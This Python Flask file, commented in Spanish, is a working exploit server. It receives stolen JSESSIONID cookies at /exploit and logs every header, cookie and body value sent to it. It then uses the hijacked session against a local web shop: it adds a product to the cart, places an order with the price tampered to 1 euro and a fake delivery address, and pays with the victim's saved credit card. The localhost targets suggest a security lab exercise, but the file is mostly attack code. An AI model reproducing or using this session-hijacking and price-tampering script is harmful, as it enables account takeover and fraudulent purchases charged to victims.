from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def make_malicious_requests(jsessionid):
    if not jsessionid:
        print("‚ùå No hay JSESSIONID, no se pueden hacer peticiones maliciosas")
        return
    
    # Configurar la cookie para todas las peticiones
    cookies = {'JSESSIONID': jsessionid}
    base_url = 'http://localhost:8888'
    
    print("\nüî• INICIANDO EXPLOIT MALICIOSO üî•")
    
    try:
        # Crear una sesi√≥n para mantener las cookies
        session = requests.Session()
        session.cookies.update(cookies)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # 1. A√±adir producto 3 al carrito
        print("\n1. üõí A√±adiendo producto 3 al carrito...")
        cart_response = session.post(
            f'{base_url}/products/3/addToCart',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': base_url,
                'Referer': f'{base_url}/products/35',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i'
            },
            allow_redirects=False
        )
        print(f"   Status: {cart_response.status_code}")
        
        # 2. GET orders/complete
        print("\n2. üìã Obteniendo p√°gina de completar pedido...")
        complete_response = session.get(
            f'{base_url}/orders/complete',
            headers={
                'Referer': f'{base_url}/cart',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i'
            },
            allow_redirects=False
        )
        print(f"   Status: {complete_response.status_code}")
        
        # 3. POST orders con precio manipulado y direcci√≥n maliciosa
        print("\n3. üì¶ Creando pedido malicioso...")
        order_data = {
            'payNow': 'true',
            'name': 'Home 7 (Tablets)',
            'price': '1',  # Precio manipulado a 1‚Ç¨
            'products[]': '3',
            'defaultAddress': 'false',
            'address': 'MaliciousAddress'
        }
        
        order_response = session.post(
            f'{base_url}/orders',
            data=order_data,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': base_url,
                'Referer': f'{base_url}/orders/complete',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i'
            },
            allow_redirects=False
        )
        print(f"   Status: {order_response.status_code}")
        
        # Extraer order_id de la redirecci√≥n
        order_id = None
        if order_response.status_code == 302:
            location = order_response.headers.get('Location', '')
            print(f"   Location: {location}")
            
            if '/orders/' in location and '/pay' in location:
                order_id = location.split('/orders/')[1].split('/pay')[0]
                print(f"   ‚úÖ Order ID extra√≠do: {order_id}")
            else:
                # Intentar extraer de otra manera si el formato es diferente
                order_match = re.search(r'/orders/(\d+)/', location)
                if order_match:
                    order_id = order_match.group(1)
                    print(f"   ‚úÖ Order ID extra√≠do (regex): {order_id}")
        
        # Si no se pudo extraer el order_id, usar uno por defecto
        if not order_id:
            order_id = "126"  # Usar el order_id de tu ejemplo
            print(f"   ‚ö†Ô∏è  Usando order_id por defecto: {order_id}")
        
        # 4. POST orders/{order_id}/pay para completar el pago
        print(f"\n4. üí≥ Completando pago para orden {order_id}...")
        pay_data = {
            'defaultCreditCard': 'true'
        }
        
        pay_response = session.post(
            f'{base_url}/orders/{order_id}/pay',
            data=pay_data,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': base_url,
                'Referer': f'{base_url}/orders/{order_id}/pay',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i'
            },
            allow_redirects=False
        )
        print(f"   Status: {pay_response.status_code}")
        
        # Verificar si el pago fue exitoso
        if pay_response.status_code == 302:
            final_location = pay_response.headers.get('Location', '')
            if '/confirm' in final_location:
                print("   üéâ PAGO COMPLETADO EXITOSAMENTE!")
            else:
                print("   ‚úÖ Petici√≥n de pago enviada")
        
        print(f"\n‚úÖ EXPLOIT COMPLETADO")
        print(f"   üì¶ Producto: Home 7 (Tablets) - ID: 3")
        print(f"   üí∞ Precio manipulado: 1‚Ç¨ (en lugar del precio real)")
        print(f"   üè† Direcci√≥n maliciosa: MaliciousAddress")
        print(f"   üÜî Order ID: {order_id}")
        
    except requests.exceptions.RequestException as e:
        print(f"‚ùå Error en el exploit: {e}")

@app.route('/exploit', methods=['POST', 'GET'])
def exploit():
    print("\n" + "="*50)
    print("PETICI√ìN RECIBIDA")
    print("="*50)
    
    # Mostrar headers
    print("HEADERS:")
    for header, value in request.headers:
        print(f"  {header}: {value}")
    
    # Mostrar cookies
    print("\nCOOKIES:")
    for cookie, value in request.cookies.items():
        print(f"  {cookie}: {value}")
    
    # Mostrar datos del cuerpo (body)
    print("\nBODY DATA:")
    if request.is_json:
        print(f"  JSON: {request.get_json()}")
    else:
        print(f"  Form Data: {request.form.to_dict()}")
        raw_data = request.get_data(as_text=True)
        print(f"  Raw Data: {raw_data}")
    
    # Buscar espec√≠ficamente JSESSIONID
    jsessionid = request.cookies.get('JSESSIONID') or request.form.get('jsessionid')
    
    # Tambi√©n buscar en par√°metros GET y en raw data
    if not jsessionid and request.method == 'GET':
        jsessionid = request.args.get('c')
    
    if not jsessionid:
        raw_data = request.get_data(as_text=True)
        if raw_data and 'c=' in raw_data:
            jsessionid = raw_data.split('c=')[1].split('&')[0]
        elif raw_data and 'jsessionid=' in raw_data.lower():
            jsessionid = raw_data.split('jsessionid=')[1].split('&')[0]

    if jsessionid:
        # Limpiar la cookie por si tiene caracteres extra√±os
        jsessionid = jsessionid.strip()
        if 'JSESSIONID=' in jsessionid:
            jsessionid = jsessionid.split('JSESSIONID=')[1].split(';')[0]
        
        print(f"\n‚úÖ JSESSIONID ENCONTRADA: {jsessionid}")
        # Ejecutar las peticiones maliciosas
        make_malicious_requests(jsessionid)
    else:
        print(f"\n‚ùå JSESSIONID NO ENCONTRADA")
    
    print("="*50 + "\n")
    
    return jsonify({"status": "received", "jsessionid": jsessionid})

if __name__ == '__main__':
    print("üöÄ Servidor de exploit iniciado en http://localhost:9999")
    print("üìù Escuchando en /exploit")
    print("üî• Listo para recibir cookies JSESSIONID y ejecutar el exploit")
    print("‚èπÔ∏è  Presiona Ctrl+C para detener el servidor\n")
    app.run(host='localhost', port=9999, debug=True)